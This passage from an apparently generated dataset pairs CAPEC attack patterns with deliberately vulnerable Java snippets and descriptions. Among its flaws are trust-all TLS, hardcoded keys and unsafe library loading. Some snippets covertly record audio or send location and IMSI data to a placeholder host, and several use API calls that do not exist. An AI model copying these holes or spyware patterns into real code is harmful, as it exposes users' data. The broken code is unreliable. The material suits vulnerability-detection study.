        "code_snippet": "public class LocationTracker {\n    private static final String WIFI_SSID = \"MyNetwork\";\n    private static final String DEVICE_MAC = \"00:11:22:33:44:55\";\n    \n    public void transmitLocation() {\n        Socket socket = new Socket(\"remote-server.com\", 8080);\n        PrintWriter out = new PrintWriter(socket.getOutputStream(), true);\n        \n        // Unencrypted transmission of sensitive location data\n        double latitude = GPS.getCurrentLatitude();\n        double longitude = GPS.getCurrentLongitude();\n        String deviceId = getDeviceIMSI();\n        \n        // Broadcasting location with high power signal\n        WifiManager wifiManager = (WifiManager) getSystemService(Context.WIFI_SERVICE);\n        wifiManager.setWifiEnabled(true);\n        wifiManager.setTxPower(WifiManager.TX_POWER_HIGH);\n        \n        // No verification of recipient\n        out.println(\"LOCATION:\" + deviceId + \":\" + latitude + \":\" + longitude);\n        \n        // Signal handler not properly protected\n        SignalHandler handler = new SignalHandler() {\n            public void handle(Signal sig) {\n                // Shared state without proper synchronization\n                transmitEmergencyLocation();\n            }\n        };\n        Signal.handle(new Signal(\"INT\"), handler);\n        \n        socket.close();\n    }\n    \n    private String getDeviceIMSI() {\n        TelephonyManager telephonyManager = \n            (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);\n        return telephonyManager.getSubscriberId(); // Returns IMSI\n    }\n}",
        "description": "This vulnerable code demonstrates location tracking functionality that broadcasts sensitive location data through WiFi and cellular signals without proper protection. It includes unencrypted transmission of location data, high-power signal broadcasting that enables location tracking through signal strength, unverified communication channels, lack of message integrity checks, and unsafe signal handler implementation. The code exposes IMSI and location data, making it susceptible to physical side-channel attacks and location tracking through RF signal strength analysis."
    },
    {
        "capec_id": "620",
        "capec_name": "Drop Encryption Level",
        "code_snippet": "public class InsecureSSLClient {\n    private static final String HARDCODED_KEY = \"abc123key\";\n    \n    public void negotiateConnection(Socket socket) {\n        try {\n            SSLContext sslContext = SSLContext.getInstance(\"SSL\");\n            TrustManager[] trustAllCerts = new TrustManager[] {\n                new X509TrustManager() {\n                    public X509Certificate[] getAcceptedIssuers() { return null; }\n                    public void checkClientTrusted(X509Certificate[] certs, String authType) {}\n                    public void checkServerTrusted(X509Certificate[] certs, String authType) {}\n                }\n            };\n            \n            sslContext.init(null, trustAllCerts, new java.security.SecureRandom());\n            SSLSocketFactory ssf = sslContext.getSocketFactory();\n            \n            // Accept any SSL/TLS protocol version including weak ones\n            String[] protocols = {\"SSLv3\", \"TLSv1\"};\n            ((SSLSocket)socket).setEnabledProtocols(protocols);\n            \n            // Store sensitive data without encryption\n            String creditCard = \"4111-1111-1111-1111\";\n            FileWriter fw = new FileWriter(\"customer_data.txt\");\n            fw.write(creditCard);\n            fw.close();\n        } catch(Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This code demonstrates multiple encryption vulnerabilities including algorithm downgrade by accepting weak SSL/TLS protocols, using a hardcoded cryptographic key, storing sensitive data (credit card) in cleartext, and implementing a trust manager that accepts any certificate without validation. The code allows for SSL/TLS protocol downgrade attacks and insecure data storage."
    },
    {
        "capec_id": "621",
        "capec_name": "Analysis of Packet Timing and Sizes",
        "code_snippet": "public class SensitiveDataTransmitter {\n    private Socket socket;\n    private static final int PACKET_SIZE = 1024;\n    \n    public void sendSensitiveData(String userName, String password, String creditCard) {\n        try {\n            socket = new Socket(\"remote-server.com\", 8080);\n            DataOutputStream out = new DataOutputStream(socket.getOutputStream());\n            \n            // Deliberately adding timing variations based on data length\n            Thread.sleep(userName.length() * 10);\n            out.writeBytes(userName);\n            \n            Thread.sleep(password.length() * 10);\n            out.writeBytes(password);\n            \n            // Breaking credit card into fixed-size chunks for transmission\n            byte[] data = creditCard.getBytes();\n            int chunks = (int) Math.ceil(data.length / (double)PACKET_SIZE);\n            \n            for(int i = 0; i < chunks; i++) {\n                int size = Math.min(PACKET_SIZE, data.length - i * PACKET_SIZE);\n                byte[] chunk = new byte[size];\n                System.arraycopy(data, i * PACKET_SIZE, chunk, 0, size);\n                out.write(chunk);\n                Thread.sleep(50);  // Fixed delay between chunks\n            }\n            \n            out.flush();\n        } catch(Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates several security issues related to timing-based information leakage. It transmits sensitive data (username, password, and credit card) with timing variations that are proportional to the data length, creating a timing channel. The code also uses fixed-size chunks for transmission, which could leak information about data size through packet analysis. Additionally, the sensitive data is transmitted without proper encryption, making it susceptible to network sniffing attacks."
    },
    {
        "capec_id": "622",
        "capec_name": "Electromagnetic Side-Channel Attack",
        "code_snippet": "public class InsecureCryptoProcessor {\n    private static final String SECRET_KEY = \"MyS3cr3tK3y!\";\n    \n    public void processEncryption(byte[] data) {\n        try {\n            // Unprotected cryptographic operations susceptible to side-channel analysis\n            for (int i = 0; i < data.length; i++) {\n                // Direct XOR operation with key bytes, making it vulnerable to power analysis\n                data[i] ^= SECRET_KEY.getBytes()[i % SECRET_KEY.length()];\n                \n                // Introducing timing variations based on data values\n                if (data[i] != 0) {\n                    Thread.sleep(1); // Variable timing based on data\n                }\n                \n                // No electromagnetic shielding or countermeasures\n                performSensitiveCalculation(data[i]);\n            }\n            \n            // Transmitting processed data without checking endpoint authenticity\n            sendDataOverNetwork(data);\n            \n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n    \n    private void performSensitiveCalculation(byte value) {\n        // CPU-intensive operation that causes distinct electromagnetic emissions\n        for (int i = 0; i < value * 100; i++) {\n            Math.pow(value, 2);\n        }\n    }\n    \n    private void sendDataOverNetwork(byte[] data) {\n        // Sending sensitive data without proper channel security\n        try (Socket socket = new Socket(\"remote-server\", 8080)) {\n            socket.getOutputStream().write(data);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This code demonstrates vulnerability to electromagnetic side-channel attacks by implementing cryptographic operations without any protection against power analysis or electromagnetic emanations. It uses an insecure XOR-based encryption, introduces timing variations, performs unprotected CPU-intensive calculations, and transmits sensitive data over an unsecured channel. The code is susceptible to electromagnetic analysis due to lack of shielding and countermeasures against side-channel attacks."
    },
    {
        "capec_id": "623",
        "capec_name": "Compromising Emanations Attack",
        "code_snippet": "public class SensitiveDataProcessor {\n    private static final int SECRET_KEY = 0xDEADBEEF;\n    private static final int ITERATIONS = 1000000;\n\n    public void processData(String userData) {\n        // Perform CPU-intensive operation with secret key\n        for(int i = 0; i < ITERATIONS; i++) {\n            int result = SECRET_KEY ^ i;\n            // Power consumption varies based on number of 1s in result\n            int hammingWeight = Integer.bitCount(result);\n\n            // Timing variations expose secret through power analysis\n            if(hammingWeight > 16) {\n                try {\n                    Thread.sleep(1);\n                } catch(InterruptedException e) {}\n            }\n\n            // Acoustic leakage through CPU fan speed\n            if(result % 256 == 0) {\n                performIntensiveCalculation();\n            }\n        }\n    }\n\n    private void performIntensiveCalculation() {\n        double temp = 1.0;\n        for(int i = 0; i < 10000; i++) {\n            temp *= Math.sqrt(temp);\n        }\n    }\n}",
        "description": "This code demonstrates multiple side-channel vulnerabilities including power analysis, timing, and acoustic emanations. The processing loop creates observable patterns in power consumption through bit operations, timing variations based on data values, and CPU fan speed changes that could leak information about the secret key through physical measurements. The code is vulnerable to both electromagnetic and acoustic side-channel analysis."
    },
    {
        "capec_id": "624",
        "capec_name": "Hardware Fault Injection",
        "code_snippet": "public class CryptoProcessor {\n    private static final byte[] secretKey = {0x12, 0x34, 0x56, 0x78};\n    private volatile boolean isProcessing = false;\n    \n    public byte[] performCryptoOperation(byte[] data) {\n        isProcessing = true;\n        byte[] result = new byte[data.length];\n        \n        // No temperature or voltage monitoring\n        // No error detection or correction\n        for(int i = 0; i < data.length; i++) {\n            // Direct key operation without protection\n            result[i] = (byte)(data[i] ^ secretKey[i % secretKey.length]);\n            \n            // Unprotected timing-critical operation\n            try {\n                Thread.sleep(1); // Vulnerable to clock manipulation\n            } catch(InterruptedException e) {\n                // No handling of interruption\n            }\n        }\n        \n        isProcessing = false;\n        return result;\n    }\n}",
        "description": "This code implements a vulnerable cryptographic processor that lacks protection against physical manipulation attacks. It performs cryptographic operations without monitoring environmental conditions (temperature, voltage), has no fault detection mechanisms, and contains timing-sensitive operations that could be exploited through clock glitching. The secret key is stored in memory without protection against electromagnetic fault injection, and the processing loop lacks error detection that could identify instruction skips or hardware faults."
    },
    {
        "capec_id": "625",
        "capec_name": "Mobile Device Fault Injection",
        "code_snippet": "public class CryptoDevice {\n    private static final byte[] secretKey = new byte[32];\n    private boolean isVoltageNormal = true;\n    private boolean isTemperatureNormal = true;\n    \n    public byte[] performCryptoOperation(byte[] data) {\n        // No voltage or temperature checks during operation\n        byte[] result = new byte[data.length];\n        for(int i = 0; i < data.length; i++) {\n            // Vulnerable to glitch attacks during operation\n            result[i] = (byte)(data[i] ^ secretKey[i % secretKey.length]);\n            // No error detection or handling for faulted operations\n            // No protection against instruction skips\n        }\n        return result;\n    }\n    \n    public void clockManager(int frequency) {\n        // Direct access to clock management without restrictions\n        setClockFrequency(frequency);\n    }\n    \n    private native void setClockFrequency(int freq);\n}",
        "description": "This code represents a cryptographic device implementation vulnerable to fault injection attacks. It lacks proper voltage monitoring, temperature checks, and fault detection mechanisms. The code provides unrestricted access to clock management and performs cryptographic operations without protecting against glitch attacks or instruction skips. There are no safeguards against electromagnetic interference or verification of operation integrity."
    },
    {
        "capec_id": "626",
        "capec_name": "Smudge Attack",
        "code_snippet": "public class TouchscreenPinPad {\n    private static final int PIN_LENGTH = 4;\n    private int[] pinPattern = new int[PIN_LENGTH];\n    \n    public void displayPinPad() {\n        JButton[] buttons = new JButton[10];\n        // Always display numbers in the same fixed position\n        for(int i = 0; i < 10; i++) {\n            buttons[i] = new JButton(String.valueOf(i));\n            buttons[i].setBounds(50 * (i % 3), 50 * (i / 3), 50, 50);\n        }\n    }\n    \n    public boolean verifyPin(int[] enteredPin) {\n        // No randomization or cleaning of touch surface\n        boolean result = true;\n        for(int i = 0; i < PIN_LENGTH; i++) {\n            if(enteredPin[i] != pinPattern[i]) {\n                result = false;\n            }\n        }\n        return result;\n    }\n}",
        "description": "This vulnerable code implements a touchscreen PIN pad that is susceptible to smudge attacks. The PIN pad buttons are displayed in a fixed position without any randomization, and there's no mechanism to clean or obscure touch patterns between uses. This allows an attacker to observe oil smudge patterns left on the screen to determine the PIN digits, even if they can't determine the exact order. The code also lacks any protection against physical observation or replay attacks."
    },
    {
        "capec_id": "627",
        "capec_name": "Counterfeit GPS Signals",
        "code_snippet": "public class GPSReceiver {\n    private double latitude;\n    private double longitude;\n    private long timestamp;\n\n    public void processGPSSignal(String gpsSignal) {\n        // Vulnerable: No verification of GPS signal source\n        String[] parts = gpsSignal.split(\",\");\n        \n        // Vulnerable: No integrity check of received data\n        if(parts.length >= 3) {\n            try {\n                latitude = Double.parseDouble(parts[0]);\n                longitude = Double.parseDouble(parts[1]);\n                timestamp = Long.parseLong(parts[2]);\n                \n                // Vulnerable: Blindly accepts and uses the received coordinates\n                updateLocation(latitude, longitude, timestamp);\n            } catch(NumberFormatException e) {\n                // Truncates error information\n                System.out.println(\"Error processing GPS data\");\n            }\n        }\n    }\n\n    private void updateLocation(double lat, double lon, long time) {\n        // Vulnerable: No replay protection\n        this.latitude = lat;\n        this.longitude = lon;\n        this.timestamp = time;\n    }\n}",
        "description": "This code demonstrates a vulnerable GPS receiver implementation that processes GPS signals without proper source verification, signal integrity checks, or replay protection. It accepts any incoming GPS signal format, making it susceptible to GPS spoofing attacks. The code also truncates error information and lacks proper authentication mechanisms to verify the legitimacy of received GPS signals."
    },
    {
        "capec_id": "628",
        "capec_name": "Carry-Off GPS Attack",
        "code_snippet": "public class GPSNavigationSystem {\n    private double latitude;\n    private double longitude;\n    private boolean isConnected;\n\n    public void processGPSSignal(GPSSignal signal) {\n        // No verification of signal authenticity\n        if(signal.getStrength() > 0) {\n            isConnected = true;\n            // Directly accept coordinates without validation\n            latitude = signal.getLatitude();\n            longitude = signal.getLongitude();\n            updateNavigation(latitude, longitude);\n        }\n    }\n\n    private void updateNavigation(double lat, double lon) {\n        // No integrity checks on position changes\n        setDestination(lat, lon);\n        // Truncated logging omits important signal metadata\n        logPosition(String.format(\"%.2f,%.2f\", lat, lon));\n    }\n\n    private void setDestination(double lat, double lon) {\n        // No verification of position delta or sudden changes\n        navigateTo(lat, lon);\n    }\n\n    private void navigateTo(double lat, double lon) {\n        // Vulnerable to gradual position shifting\n        // No comparison with expected route or previous coordinates\n        System.out.println(\"Navigating to: \" + lat + \",\" + lon);\n    }\n}",
        "description": "This vulnerable code demonstrates a GPS system susceptible to carry-off spoofing attacks. It lacks signal authentication (CWE-290), truncates security metadata in logs (CWE-222), doesn't verify the signal source (CWE-940), fails to validate position integrity (CWE-924), and doesn't properly verify destination coordinates (CWE-941). The system blindly accepts GPS signals and coordinates without validating their authenticity or checking for gradual position shifting, making it vulnerable to spoofing attacks where an attacker can slowly manipulate the perceived position."
    },
    {
        "capec_id": "629",
        "capec_name": "DEPRECATED: Unauthorized Use of Device Resources",
        "code_snippet": "public class ResourceManager {\n    private FileInputStream fileStream;\n    private PowerManager powerManager;\n    private boolean isAuth = false;\n\n    public void processFile(String userInput) {\n        try {\n            // CWE-67: No validation of Windows device names\n            fileStream = new FileInputStream(userInput);\n            \n            // CWE-863: Incorrect authorization check\n            if(userInput.contains(\"admin\")) {\n                isAuth = true;\n            }\n            \n            // CWE-920: No power consumption limits\n            while(true) {\n                // Continuously process data without checking power levels\n                processData();\n            }\n            \n            // CWE-772: Resource not released\n            // Missing fileStream.close()\n            \n        } catch(Exception e) {\n            e.printStackTrace();\n        }\n    }\n    \n    private void processData() {\n        // Resource intensive operation\n    }\n}",
        "description": "This vulnerable code demonstrates multiple issues: failure to release system resources, unrestricted power consumption, improper handling of Windows device names, and incorrect authorization checks. The code doesn't properly close file streams, performs infinite processing without power awareness, lacks device name validation, and implements a weak authorization mechanism."
    },
    {
        "capec_id": "630",
        "capec_name": "TypoSquatting",
        "code_snippet": "public class URLRedirectServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String redirectURL = request.getParameter(\"url\");\n        \n        if(redirectURL != null) {\n            // Vulnerable: No validation of redirect URL\n            String modifiedURL = redirectURL.replace(\" \", \"\").toLowerCase();\n            \n            // Weak domain comparison\n            if(modifiedURL.contains(\"trusted-domain\")) {\n                response.sendRedirect(redirectURL);\n            } else {\n                // Basic attempt to check if domain is similar to trusted domain\n                String originalDomain = \"trusted-domain.com\";\n                int similarity = 0;\n                for(int i = 0; i < Math.min(originalDomain.length(), modifiedURL.length()); i++) {\n                    if(originalDomain.charAt(i) == modifiedURL.charAt(i)) similarity++;\n                }\n                \n                // Vulnerable: Too permissive similarity check\n                if(similarity > originalDomain.length() * 0.8) {\n                    response.sendRedirect(redirectURL);\n                }\n            }\n        }\n    }\n}",
        "description": "This code demonstrates a vulnerable URL redirect implementation that's susceptible to typosquatting attacks. It attempts to validate redirect URLs by performing a weak similarity check against a trusted domain, but fails to properly validate the URL structure and allows redirects to potentially malicious domains that are similar to the trusted domain. The code contains multiple vulnerabilities including improper URL validation, weak string comparison, and insufficient input sanitization."
    },
    {
        "capec_id": "631",
        "capec_name": "SoundSquatting",
        "code_snippet": "public class DomainValidator {\n    public static boolean isValidDomain(String userInputDomain) {\n        try {\n            // Unsafe reverse DNS lookup for validation\n            InetAddress addr = InetAddress.getByName(userInputDomain);\n            String hostname = addr.getHostName();\n            String canonicalName = addr.getCanonicalHostName();\n            \n            // Vulnerable comparison using string names\n            if(hostname.toLowerCase().contains(\"trusted-bank\")) {\n                // Redirect to the domain without proper validation\n                String redirectUrl = \"https://\" + userInputDomain + \"/login\";\n                return true;\n            }\n            return false;\n        } catch (UnknownHostException e) {\n            return false;\n        }\n    }\n\n    public static void main(String[] args) {\n        // Vulnerable to soundsquatting - could accept \"trustedbenk.com\"\n        String userDomain = args[0];\n        if(isValidDomain(userDomain)) {\n            System.out.println(\"Domain validated, proceeding with connection...\");\n        }\n    }\n}",
        "description": "This code demonstrates a vulnerable domain validation system that's susceptible to soundsquatting attacks. It relies on unsafe reverse DNS lookup, performs string comparison for domain validation, and includes an open redirect vulnerability. The code accepts user input for domain names without proper validation, making it vulnerable to homophone-based domain spoofing attacks."
    },
    {
        "capec_id": "632",
        "capec_name": "Homograph Attack via Homoglyphs",
        "code_snippet": "public class DomainValidator {\n    private static final String DOMAIN_REGEX = \"[a-zA-Z0-9.-]+\\\\.[a-zA-Z]{2,}\";  // Insufficient regex\n\n    public boolean validateAndProcessDomain(String userInputDomain) {\n        if (userInputDomain.matches(DOMAIN_REGEX)) {\n            String normalizedDomain = userInputDomain.toLowerCase();\n            // Vulnerable: No homoglyph detection or IDN processing\n            if (normalizedDomain.contains(\"paypal\")) {\n                redirectToPaymentProcess(normalizedDomain);\n                return true;\n            }\n        }\n        return false;\n    }\n\n    private void redirectToPaymentProcess(String domain) {\n        try {\n            URL url = new URL(\"https://\" + domain + \"/process\");\n            // Vulnerable: No proper validation of the domain\n            URLConnection conn = url.openConnection();\n            conn.connect();\n        } catch (Exception e) {\n            // Silent failure\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates a domain validation system that fails to properly handle homoglyph attacks. It uses an insufficient regular expression that doesn't account for Unicode characters or IDN (Internationalized Domain Names), making it susceptible to homograph attacks. The code also lacks proper domain validation and normalization, potentially allowing malicious domains that visually appear identical to legitimate ones. Additionally, it implements unsafe URL processing that could lead to SSRF attacks."
    },
    {
        "capec_id": "633",
        "capec_name": "Token Impersonation",
        "code_snippet": "public class AuthenticationService {\n    private static final String WEAK_SECRET = \"default_secret_key\";\n    \n    public String generateToken(String username) {\n        // Weak token generation using predictable pattern\n        String token = username + \"_\" + System.currentTimeMillis() + \"_\" + WEAK_SECRET;\n        return Base64.getEncoder().encodeToString(token.getBytes());\n    }\n    \n    public boolean validateToken(String token) {\n        try {\n            // Weak token validation that doesn't properly verify identity\n            String decodedToken = new String(Base64.getDecoder().decode(token));\n            String[] parts = decodedToken.split(\"_\");\n            return parts.length == 3;\n        } catch(Exception e) {\n            return false;\n        }\n    }\n    \n    public void impersonateUser(String token) {\n        if(validateToken(token)) {\n            // Dangerous impersonation without proper verification\n            SecurityContext.setCurrentUser(token);\n            executePrivilegedOperation();\n        }\n    }\n    \n    private void executePrivilegedOperation() {\n        // Privileged operation executed under impersonated context\n        System.setProperty(\"sensitive.config\", \"new_value\");\n    }\n}",
        "description": "This code demonstrates vulnerable authentication and token generation mechanisms. It uses a weak secret key, implements insufficient token validation, and allows improper impersonation. The token generation is predictable, and the validation doesn't properly verify the identity of the user. The impersonation functionality allows elevation of privileges without proper security checks, making it possible for an attacker to generate fake tokens and execute privileged operations."
    },
    {
        "capec_id": "634",
        "capec_name": "Probe Audio and Video Peripherals",
        "code_snippet": "public class AudioSurveillance {\n    private static final String RECORDING_PATH = \"/tmp/recordings/\";\n    \n    public void startRecording() {\n        try {\n            AudioFormat format = new AudioFormat(44100, 16, 1, true, true);\n            DataLine.Info info = new DataLine.Info(TargetDataLine.class, format);\n            \n            TargetDataLine microphone = (TargetDataLine) AudioSystem.getLine(info);\n            microphone.open(format);\n            microphone.start();\n            \n            Thread recordingThread = new Thread(() -> {\n                AudioInputStream audioStream = new AudioInputStream(microphone);\n                try {\n                    String fileName = \"recording_\" + System.currentTimeMillis() + \".wav\";\n                    AudioSystem.write(audioStream, AudioFileFormat.Type.WAVE,\n                        new File(RECORDING_PATH + fileName));\n                    \n                    // Send recording over unencrypted connection\n                    Socket socket = new Socket(\"remote-server.com\", 12345);\n                    FileInputStream fileInput = new FileInputStream(RECORDING_PATH + fileName);\n                    OutputStream out = socket.getOutputStream();\n                    byte[] buffer = new byte[1024];\n                    int count;\n                    while ((count = fileInput.read(buffer)) > 0) {\n                        out.write(buffer, 0, count);\n                    }\n                    fileInput.close();\n                    out.close();\n                } catch (Exception e) {\n                    e.printStackTrace();\n                }\n            });\n            recordingThread.setDaemon(true);\n            recordingThread.start();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates an audio surveillance implementation that records from the system's microphone without proper authorization checks and transmits the recordings in cleartext over a network connection. The code runs as a background daemon process, does not implement proper access controls, and stores sensitive audio data in an unsecured temporary directory. It violates multiple security principles related to privilege management, cleartext transmission of sensitive data, and unauthorized access to system resources."
    },
    {
        "capec_id": "635",
        "capec_name": "Alternative Execution Due to Deceptive Filenames",
        "code_snippet": "public class FileUploadHandler {\n    public void processUploadedFile(String fileName, byte[] content) {\n        String extension = fileName.substring(fileName.lastIndexOf(\".\"));\n        \n        if (extension.equalsIgnoreCase(\".txt\")) {\n            String savePath = \"C:\\\\uploads\\\\\" + fileName;\n            try (FileOutputStream fos = new FileOutputStream(savePath)) {\n                fos.write(content);\n                // Process text file\n                executeTextProcessor(savePath);\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        } else if (extension.equalsIgnoreCase(\".doc\")) {\n            String savePath = \"C:\\\\documents\\\\\" + fileName;\n            try (FileOutputStream fos = new FileOutputStream(savePath)) {\n                fos.write(content);\n                // Process document\n                executeDocProcessor(savePath);\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private void executeTextProcessor(String filePath) {\n        try {\n            Runtime.getRuntime().exec(\"notepad.exe \" + filePath);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private void executeDocProcessor(String filePath) {\n        try {\n            Runtime.getRuntime().exec(\"winword.exe \" + filePath);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This code demonstrates vulnerable file handling where the application relies solely on the file extension to determine how to process uploaded files. It doesn't properly validate or sanitize the file name, allows direct input of file paths, and makes assumptions about file types based on extensions. An attacker could exploit this by uploading a malicious file with a spoofed extension or using alternative file naming conventions (like 8.3 format) to bypass security controls."
    },
    {
        "capec_id": "636",
        "capec_name": "Hiding Malicious Data or Code within Files",
        "code_snippet": "public class FileHider {\n    public static void storeHiddenData(String filePath, String maliciousCode) {\n        try {\n            File file = new File(filePath);\n            BasicFileAttributes attr = Files.readAttributes(file.toPath(), BasicFileAttributes.class);\n            UserDefinedFileAttributeView view = Files.getFileAttributeView(file.toPath(),\n                    UserDefinedFileAttributeView.class);\n            byte[] bytes = maliciousCode.getBytes();\n            ByteBuffer buffer = ByteBuffer.allocate(bytes.length);\n            buffer.put(bytes);\n            buffer.flip();\n            view.write(\"hidden.payload\", buffer);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public static String retrieveHiddenData(String filePath) {\n        try {\n            UserDefinedFileAttributeView view = Files.getFileAttributeView(\n                    Paths.get(filePath),\n                    UserDefinedFileAttributeView.class);\n            ByteBuffer buffer = ByteBuffer.allocate(view.size(\"hidden.payload\"));\n            view.read(\"hidden.payload\", buffer);\n            buffer.flip();\n            return new String(buffer.array());\n        } catch (IOException e) {\n            return null;\n        }\n    }\n}",
        "description": "This code demonstrates hiding malicious data within file metadata attributes. It uses the UserDefinedFileAttributeView class to store and retrieve hidden payloads in file extended attributes, creating a covert storage channel. The code stores sensitive information in cleartext and could be used to embed malicious code that would be difficult to detect through normal file inspection."
    },
    {
        "capec_id": "637",
        "capec_name": "Collect Data from Clipboard",
        "code_snippet": "public class SensitiveDataClipboard {\n    private static String password = \"secretPassword123\";\n    private static String apiKey = \"ak_live_12345\";\n    \n    public static void copyToClipboard() {\n        java.awt.Toolkit toolkit = java.awt.Toolkit.getDefaultToolkit();\n        java.awt.datatransfer.Clipboard clipboard = toolkit.getSystemClipboard();\n        \n        // Store sensitive data in GUI elements\n        javax.swing.JTextField passwordField = new javax.swing.JTextField(password);\n        javax.swing.JTextField apiKeyField = new javax.swing.JTextField(apiKey);\n        \n        // Copy sensitive data to clipboard\n        String sensitiveData = \"Password: \" + password + \"\\nAPI Key: \" + apiKey;\n        java.awt.datatransfer.StringSelection strSel = new java.awt.datatransfer.StringSelection(sensitiveData);\n        clipboard.setContents(strSel, null);\n        \n        // Display sensitive info in GUI (truncated for display)\n        passwordField.setText(password.substring(0, 5) + \"...\");\n        apiKeyField.setText(apiKey);\n    }\n}",
        "description": "This vulnerable code demonstrates insecure handling of sensitive information by storing credentials in cleartext and copying them to the system clipboard. The code stores API keys and passwords directly in the class, displays them in GUI elements, and makes them accessible through the system clipboard, which can be accessed by any other application on the system. The code also truncates security-relevant information in the GUI display, potentially hiding the full extent of the exposure."
    },
    {
        "capec_id": "638",
        "capec_name": "Altered Component Firmware",
        "code_snippet": "public class UnsecureBootloader {\n    private static final String MBR_LOCATION = \"/dev/sda\";\n    private static final String FIRMWARE_PATH = \"/firmware/boot.bin\";\n    \n    static {\n        System.loadLibrary(\"native_boot_lib\");\n    }\n    \n    private native void writeMBR(String location, byte[] data);\n    private native byte[] readFirmware(String path);\n    \n    public void updateBootloader() {\n        try {\n            // Load firmware without verification\n            byte[] firmwareData = readFirmware(FIRMWARE_PATH);\n            \n            // No access control checks before writing to MBR\n            writeMBR(MBR_LOCATION, firmwareData);\n            \n            // Store boot code in unprotected volatile memory\n            ByteBuffer volatileMemory = ByteBuffer.allocate(firmwareData.length);\n            volatileMemory.put(firmwareData);\n            \n            // Execute boot code without secure boot verification\n            executeBootCode(volatileMemory);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n    \n    private void executeBootCode(ByteBuffer memory) {\n        // Execute code from volatile memory without validation\n        // No immutable root of trust check\n        byte[] executableCode = memory.array();\n        unsafe.defineClass(null, executableCode, 0, executableCode.length);\n    }\n}",
        "description": "This code demonstrates multiple firmware and boot-related vulnerabilities. It allows unrestricted access to write to the MBR, loads firmware without verification, stores boot code in unprotected volatile memory, and executes code without proper secure boot validation. The code lacks proper access controls, firmware update mechanisms, and an immutable root of trust, making it susceptible to firmware-level attacks and malicious code execution during the boot process."
    },
    {
        "capec_id": "639",
        "capec_name": "Probe System Files",
        "code_snippet": "public class FileHandler {\n    public static void storeCredentials(String username, String password) {\n        try {\n            File tempFile = new File(\"/tmp/credentials.txt\");\n            FileWriter writer = new FileWriter(tempFile);\n            writer.write(\"Username: \" + username + \"\\nPassword: \" + password);\n            writer.close();\n            \n            // Set file permissions to world-readable\n            tempFile.setReadable(true, false);\n            \n            // Error handling exposes system details\n            try {\n                // Process credentials\n                throw new Exception(\"Error processing file at: \" + tempFile.getAbsolutePath());\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n        } catch (IOException e) {\n            System.out.println(\"File path: \" + System.getProperty(\"user.dir\") + \n                             \"\\nSystem details: \" + System.getProperty(\"os.name\"));\n        }\n    }\n}",
        "description": "This code creates a temporary file with sensitive credentials, making it world-readable and storing it in a predictable location. It also exposes sensitive system information through error messages. The file lacks proper access controls, is stored in a publicly accessible directory, and the error handling reveals system-specific details that could aid an attacker."
    },
    {
        "capec_id": "640",
        "capec_name": "Inclusion of Code in Existing Process",
        "code_snippet": "public class UnsafeLibraryLoader {\n    static {\n        try {\n            // Dynamically load library from an untrusted location\n            String libraryPath = System.getProperty(\"user.dir\") + \"/ext/lib.dll\";\n            System.load(libraryPath);\n            \n            // Unsafe reflection to modify running process\n            Class<?> processClass = Class.forName(\"java.lang.ProcessImpl\");\n            java.lang.reflect.Field f = processClass.getDeclaredField(\"handle\");\n            f.setAccessible(true);\n            \n            // Inject custom code into running process\n            Runtime.getRuntime().loadLibrary(\"customcode\");\n            \n            // Modify process memory directly\n            sun.misc.Unsafe unsafe = getUnsafeInstance();\n            long address = unsafe.allocateMemory(1024);\n            unsafe.putAddress(address, 0xdeadbeef);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n    \n    private static sun.misc.Unsafe getUnsafeInstance() throws Exception {\n        java.lang.reflect.Field f = sun.misc.Unsafe.class.getDeclaredField(\"theUnsafe\");\n        f.setAccessible(true);\n        return (sun.misc.Unsafe) f.get(null);\n    }\n}",
        "description": "This code demonstrates process manipulation vulnerabilities by loading untrusted libraries, using reflection to modify process internals, and directly manipulating process memory using sun.misc.Unsafe. It includes dynamic library loading from an untrusted path, reflection to access private process fields, and direct memory manipulation, all of which could be exploited for process injection attacks."
    },
    {
        "capec_id": "641",
        "capec_name": "DLL Side-Loading",
        "code_snippet": "public class DLLLoader {\n    static {\n        try {\n            // Vulnerable: Uses system path to load DLL without verification\n            String dllPath = System.getProperty(\"java.library.path\") + \"\\\\mylib.dll\";\n            System.load(dllPath);\n        } catch (UnsatisfiedLinkError e) {\n            // Fallback to searching in default Windows directories\n            System.loadLibrary(\"mylib\");\n        }\n    }\n    \n    public native void performOperation();\n    \n    public static void main(String[] args) {\n        DLLLoader loader = new DLLLoader();\n        loader.performOperation();\n    }\n}",
        "description": "This code demonstrates vulnerable DLL loading by attempting to load a native library without proper path validation or manifest specifications. It first tries to load from the system library path, then falls back to the default Windows search behavior, making it susceptible to DLL side-loading attacks. The code doesn't verify the authenticity of the DLL or use explicit WinSxS manifests, allowing an attacker to potentially place a malicious DLL in one of the searched locations."
    },
    {
        "capec_id": "642",
        "capec_name": "Replace Binaries",
        "code_snippet": "public class InsecureFileExecutor {\n    public static void executeFile(String binary) {\n        String tempDir = System.getProperty(\"java.io.tmpdir\");\n        String binaryPath = tempDir + \"Program Files\" + \"/\" + binary;\n        \n        // Insecure file permissions when writing\n        File file = new File(binaryPath);\n        file.setExecutable(true, false);\n        file.setWritable(true, false);\n        \n        // Insecure command execution with unvalidated input\n        try {\n            ProcessBuilder pb = new ProcessBuilder(binaryPath);\n            pb.start();\n            \n            // Clean up attempt but file remains with weak permissions\n            Runtime.getRuntime().addShutdownHook(new Thread() {\n                public void run() {\n                    file.delete();\n                }\n            });\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
